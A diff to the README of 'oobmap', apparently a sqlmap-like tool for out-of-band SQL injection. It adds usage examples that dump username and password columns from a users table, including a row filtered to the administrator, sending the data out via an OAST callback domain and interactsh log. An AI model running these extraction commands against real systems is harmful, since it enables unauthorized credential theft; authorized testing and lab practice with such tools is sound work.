@@ -214,12 +214,36 @@ oobmap enum -r req.txt -p TrackingId --dbms mssql \
   --columns -T users --limit 20
 ```
 
-Use table/column syntax:
+Dump rows from a table:
 
 ```bash
 oobmap dump -r req.txt -p TrackingId --dbms mssql \
   --domain abc123.oast.site --log interactsh.jsonl \
-  -T users -C password --where "username='administrator'"
+  -T users -C username,password --limit 20
+```
+
+If you omit `-C`, `oobmap` enumerates the columns first and then dumps them:
+
+```bash
+oobmap dump -r req.txt -p TrackingId --dbms mssql \
+  --domain abc123.oast.site --log interactsh.jsonl \
+  -T users --limit 20
+```
+
+Dump with a filter:
+
+```bash
+oobmap dump -r req.txt -p TrackingId --dbms mssql \
+  --domain abc123.oast.site --log interactsh.jsonl \
+  -T users -C username,password --where "username='administrator'" --limit 1
+```
+
+Use `-D` when the DBMS needs a database/schema/catalog:
+
+```bash
+oobmap dump -r req.txt -p TrackingId --dbms postgres-program \
+  --domain abc123.oast.site --log interactsh.jsonl \
+  -D public -T users -C username,password
 ```
 
 ## Injection Points
@@ -292,6 +316,20 @@ Useful options:
 --output-dir DIR     # store sessions somewhere else
 --flush-session     # delete the current target session before running
 --fresh-queries     # ignore cached extraction values but keep other session data
+```
+
+`dump` validates the target table and columns against the current session/catalog.
+If they are missing from the session, `oobmap` enumerates them first. This means:
+
+```bash
+oobmap dump ... -T users
+```
+
+will first discover the columns for `users`, then dump all discovered columns.
+To skip validation and go straight to the query, provide `-C` and use:
+
+```bash
+--no-validate
 ```
 
 Examples:
@@ -407,6 +445,8 @@ Implemented:
 - `dump` helper for one table/column expression;
 - metadata extraction with `enum --banner --current-user --current-db`;
 - table and column enumeration with `enum --tables` and `enum --columns -T <table>`;
+- multi-row, multi-column dump with `dump -T <table> -C col1,col2 --limit N`;
+- table/column validation before dump, with auto column enumeration when `-C` is omitted;
 - automatic resume with `session.sqlite`;
 - `--output-dir`, `--flush-session`, `--fresh-queries`;
 - `--force-ssl`, `--batch`, `--risk`, and `--verbose` style options.
@@ -414,6 +454,7 @@ Implemented:
 Not implemented yet:
 
 - full `--dbs` enumeration and multi-schema selection;
+- CSV/JSON dump output files;
 - WAF bypass/tamper scripts;
 - DBMS fingerprinting;
 - boolean/time/error/UNION exploitation;
